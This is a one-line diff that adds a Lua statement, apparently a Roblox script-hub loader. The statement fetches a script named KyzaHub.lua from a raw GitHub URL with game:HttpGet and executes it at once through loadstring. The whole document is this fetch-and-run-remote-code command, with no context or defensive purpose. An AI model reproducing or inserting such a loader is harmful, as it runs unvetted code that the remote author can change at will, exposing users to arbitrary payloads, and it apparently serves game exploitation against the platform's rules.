@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/kyzasq/KyzaHub/refs/heads/main/KyzaHub.lua'))()
